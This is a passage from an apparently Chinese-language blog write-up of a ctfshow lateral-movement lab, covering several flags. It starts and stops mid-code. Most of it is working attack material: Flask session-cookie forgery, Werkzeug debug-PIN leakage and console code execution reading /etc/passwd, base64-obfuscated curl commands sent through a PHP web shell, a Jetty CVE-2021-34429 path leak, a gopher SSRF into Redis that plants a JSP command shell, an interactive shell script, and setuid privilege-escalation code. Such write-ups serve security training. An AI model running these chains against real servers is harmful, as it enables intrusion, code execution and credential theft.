class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查会话中的用户是否为 admin</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /key 路由，处理 GET 请求，获取特定文件中的密钥</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 尝试打开文件读取密钥</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /set_log_option 路由，处理设置日志选项的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志名称和日志文件名称</span></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取日志记录器并添加文件处理器</span></span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 清空日志文件内容</span></span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /get_log_content 路由，处理获取日志内容的请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从请求参数中获取日志文件名称</span></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    <span class="comment"># 拼接文件路径</span></span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空指定文件内容的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用，开启调试模式，监听所有 IP 地址，端口为 8888</span></span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>而通过爆破可以测出8888端口的flask服务：</p><p><img src="/archives/16d06f93/QQ20250227-221222.png"></p><p>而访问时发现有cookie：</p><p><img src="/archives/16d06f93/QQ20250228-185100.png"></p><p>毫无疑问<strong>session伪造</strong>了，密钥给了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5</span><br></pre></td></tr></table></figure><p><strong>session伪造工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27; -t &#x27;&#123;&quot;user&quot;:&quot;admin&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250228-190858.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie:session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4</span><br></pre></td></tr></table></figure><p>拿到伪造的cokie后直接访问是不行的，这里需要我们利用之前写的马通过curl命令将cookie带过去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  http://172.2.237.6:8888/key</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250228-193501.png"></p><p><code>flag9：ctfshow&#123;4f5d1d5d-1d5d-1d5d1d5d1d5d&#125;</code></p><h4 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a>顺藤摸瓜</h4><p>需要<strong>提交flask所在服务器的&#x2F;etc&#x2F;passwd 文件最后一行内容</strong></p><p>main.py.bak可以看到debug为true，或许可以打<strong>pin码泄露</strong>。</p><p>访问<code>/console</code>路由：</p><p><img src="/archives/16d06f93/QQ20250228-200132.png"></p><p>可以看到用了Werkzeug，同时console的key：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">motSXRASEKviSbHLumrO</span><br></pre></td></tr></table></figure><p>下面需要<strong>创建一个日志文件，将pin码打印在文件上</strong></p><p>而设置<strong>loggername为werkzeug记录flask的日志</strong>（可在logdict里看）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/set_log_option%3flogName=werkzeug%2526logFile=main.log&quot;</span><br></pre></td></tr></table></figure><p>这里可以通过<strong>printpin来泄露pin码</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/console%3f__debugger__=yes%2526cmd=printpin%2526s=motSXRASEKviSbHLumrO&quot;</span><br></pre></td></tr></table></figure><p>查看我们的日志文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/get_log_content?logFile=main.log&quot;</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250228-205814.png"></p><p>拿到pin码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">834-059-141</span><br></pre></td></tr></table></figure><p>然后用<strong>pin码进行验证</strong>，将cookie保存在本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl -c 1.txt -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;  &quot;http://172.2.237.6:8888/console%3f__debugger__=yes%2526cmd=pinauth%2526pin=834-059-141%2526s=motSXRASEKviSbHLumrO&quot;</span><br></pre></td></tr></table></figure><p>访问1.txt拿到cookie:</p><p><img src="/archives/16d06f93/QQ20250228-210546.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49</span><br></pre></td></tr></table></figure><p>利用cookie去进行RCE，这里直接读：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=print(__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&#x27;).read())&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p>这里不知道为什么执行不了，我就将cmd.php里的system改成eval了</p><p>重新进行rce:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgLWIgICJfX3d6ZDFiYjgwMDBmZTg2YThkMzViYTkwPTE3NDA3NDc5MDF8ZjkyMTEzODg5YjQ5IiAgImh0dHA6Ly8xNzIuMi4yMzcuNjo4ODg4L2NvbnNvbGU/X19kZWJ1Z2dlcl9fPXllcyZjbWQ9cHJpbnQoX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0JTIwXC9ldGNcL3Bhc3N3ZCcpLnJlYWQoKSkmZnJtPTAmcz1tb3RTWFJBU0VLdmlTYkhMdW1yTyI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=print(__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&#x27;).read())&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250228-222730.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">ctfer:x:1000:1000::/home/ctfer:/bin/bash</span><br></pre></td></tr></table></figure><p>也可以进行外带注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgLWIgICJfX3d6ZDFiYjgwMDBmZTg2YThkMzViYTkwPTE3NDA3NDc5MDF8ZjkyMTEzODg5YjQ5IiAgImh0dHA6Ly8xNzIuMi4yMzcuNjo4ODg4L2NvbnNvbGU/X19kZWJ1Z2dlcl9fPXllcyZjbWQ9X19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0JTIwXC9ldGNcL3Bhc3N3ZD4uXC9sb2dcL21haW4ubG9nJykmZnJtPTAmcz1tb3RTWFJBU0VLdmlTYkhMdW1yTyI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&gt;.\/log\/main.log&#x27;)&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p>再访问main.log即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAtdiAtYiAic2Vzc2lvbj1leUoxYzJWeUlqb2lZV1J0YVc0aWZRLlo4R1pQdy5vZ2hpOUJ4NXRZMl85d2l6MDJlSjlSVWR4UDQiICAiaHR0cDovLzE3Mi4yLjIzNy42Ojg4ODgvZ2V0X2xvZ19jb250ZW50P2xvZ0ZpbGU9bWFpbi5sb2ci&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl -v -b <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/get_log_content?logFile=main.log&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250228-223635.png"></p><p>也可以用大佬写的interactive shell脚本，内容根据情况修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="comment"># data = urllib.parse.quote(data)</span></span><br><span class="line">    <span class="comment"># python_shell = &#x27;curl --cookie &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk;__wzd2fb5743f98b45463400e=1736152460|4bfc86e353c8&quot; &quot;http://172.2.252.6:8888/console?__debugger__=yes&amp;s=eABh7cMeNgMKri1DSi4w&amp;cmd=&#123;&#125;&amp;frm=1&quot;&#x27;.format(data)</span></span><br><span class="line">    <span class="comment"># python_shell = base64.b64encode(python_shell.encode()).decode()</span></span><br><span class="line">    data = base64.b64encode(data.encode()).decode()</span><br><span class="line">    <span class="comment"># normal_shell = &#x27;echo &quot;&#x27; + data + &#x27;&quot; | base64 -d | sh&#x27;</span></span><br><span class="line">    normal_shell=data</span><br><span class="line">    <span class="comment"># url = &quot;https://543f943e-6f90-43b4-bfc8-ee86d2fb3f34.challenge.ctf.show/downloadTaskFile?url=http://172.2.239.5/1.php?1=phpinfo();&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://9c30a725-a36d-4e54-874b-f088dc3d80cf.challenge.ctf.show/downloadTaskFile?url=http://172.2.233.5/1.php?1=system(base64_decode(\&quot;&quot;</span>+normal_shell+<span class="string">&quot;\&quot;));&quot;</span></span><br><span class="line">    response = requests.get(url, verify=<span class="literal">False</span>, headers=&#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTgzNjIzMjMxN30.nB-6uWH-wBxU3e_QJLw1O_TaPARU5o2DUe-y1TvqX5w&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        <span class="comment"># print(response.json())</span></span><br><span class="line">        <span class="comment"># print(response.json()[&quot;url&quot;])</span></span><br><span class="line">        <span class="built_in">print</span>(response.json()[<span class="string">&quot;file_content&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><code>flag10：ctfshow&#123;ctfer:x:1000:1000::/home/ctfer:/bin/bash&#125;</code></p><h3 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h3><h4 id="艰难的最后一步"><a href="#艰难的最后一步" class="headerlink" title="艰难的最后一步"></a>艰难的最后一步</h4><p>需要<strong>提交redis的密码</strong></p><p>这里继续横向渗透，发现7的8080端口存在jetty服务，Eclipse Jetty是一个Java Web 服务器和Java Servlet容器。</p><p><img src="/archives/16d06f93/QQ20250301-144914.png"></p><p>看了下服务器版本为<code>Jetty(9.4.40.v20210413)</code>，直接搜：<a href="https://xz.aliyun.com/news/11267?u_atoken=5cf7bf3f92f98efc3c5a4e7ef58dac09&u_asig=0a47315217408114017564414e00c9/eb699">jetty常用渗透总结</a></p><p><img src="/archives/16d06f93/QQ20250301-145338.png"></p><p>发现存在信息泄露，<strong>CVE-2021-34429</strong>直接打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/.%00/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250301-145629.png"></p><p>port为6380</p><p><code>flag11：ctfshow&#123;ctfshow_2025&#125;</code></p><h4 id="功亏一篑"><a href="#功亏一篑" class="headerlink" title="功亏一篑"></a>功亏一篑</h4><p>需要<strong>提交 &#x2F;dylan.txt 中的key</strong></p><p><code>/dylan.txt</code>在根目录里，而前面我们拿到了redis密码，这里自然要登陆redis</p><p>登录redis：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgICJkaWN0Oi8vMTcyLjIuMTM5Ljc6NjM4MC9hdXRoOmN0ZnNob3dfMjAyNSI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v  <span class="string">&quot;dict://172.2.139.7:6380/auth:ctfshow_2025&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250301-152329.png"></p><p>构造gopher请求写jsp马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth ctfshow_2025</span><br><span class="line">set mars &quot;&lt;% Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;,\&quot;-c\&quot;,request.getParameter(\&quot;cmd\&quot;)&#125;);%&gt;&quot;</span><br><span class="line">config set dir /opt/jetty/webapps/ROOT/</span><br><span class="line">config set dbfilename 2.jsp</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>url编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.2.139.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgICJnb3BoZXI6Ly8xNzIuMi4xMzkuNzo2MzgwL19hdXRoJTIwY3Rmc2hvd18yMDI1JTBBc2V0JTIwbWFycyUyMCUyMiUzQyUyNSUyMFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3JTIwU3RyaW5nJTVCJTVEJTdCJTVDJTIyc2glNUMlMjIlMkMlNUMlMjItYyU1QyUyMiUyQ3JlcXVlc3QuZ2V0UGFyYW1ldGVyKCU1QyUyMmNtZCU1QyUyMiklN0QpJTNCJTI1JTNFJTIyJTBBY29uZmlnJTIwc2V0JTIwZGlyJTIwJTJGb3B0JTJGamV0dHklMkZ3ZWJhcHBzJTJGUk9PVCUyRiUwQWNvbmZpZyUyMHNldCUyMGRiZmlsZW5hbWUlMjAyLmpzcCUwQXNhdmUlMEFxdWl0Ig==&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v  <span class="string">&quot;gopher://172.2.139.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250301-154409.png"></p><p>由于没有回显，所以需要带到其他文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=ls%20/&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/1.txt</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250301-155853.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250301-160000.png"></p><p><code>flag12：ctfshow&#123;7b11a7ae330883cb5bf667a9c1604635&#125;</code></p><h4 id="今日方知我是我"><a href="#今日方知我是我" class="headerlink" title="今日方知我是我"></a>今日方知我是我</h4><p>需要<strong>提交&#x2F;root&#x2F;message.txt中提到的网址</strong></p><p>需要提权</p><p>查suid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250301-161120.png"></p><p>没有可以利用的</p><p>查cap权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=getcap%20-r%20/%202&gt;/dev/null&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><p><img src="/archives/16d06f93/QQ20250301-161358.png"></p><p>发现java有setuid权限</p><p>不会Java提权，只能参考官方wp的做法：</p><p>写入SetUID.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_SetUID_setUID</span><span class="params">(JNIEnv *env, jobject obj, jint uid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> setuid(uid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=<span class="built_in">echo</span>%20<span class="string">&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;</span>%20|<span class="built_in">base64</span>%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>写入SetUID.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetUID</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SetUID&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">setUID</span><span class="params">(<span class="type">int</span> uid)</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span 